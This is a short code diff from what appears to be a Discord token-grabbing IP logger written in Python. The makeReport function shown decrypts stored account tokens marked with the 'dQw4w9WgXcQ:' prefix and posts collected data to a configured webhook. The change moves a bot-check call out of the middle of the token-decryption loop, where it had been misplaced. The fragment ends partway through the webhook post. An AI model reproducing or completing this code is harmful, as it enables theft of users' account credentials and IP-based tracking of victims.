@@ -106,6 +106,8 @@ def reportError(error):
 def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
     if ip.startswith(blacklistedIPs):
         return
+
+    bot = botCheck(ip, useragent)
     tokens = []
     cleaned = []
     already_check = []
@@ -161,9 +163,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
                 cleaned.append(i)
         for token in cleaned:
             try:
-                tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
-    bot = botCheck(ip, useragent)
-    
+                tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])    
     if bot:
         requests.post(config["webhook"], json = {
     "username": config["username"],
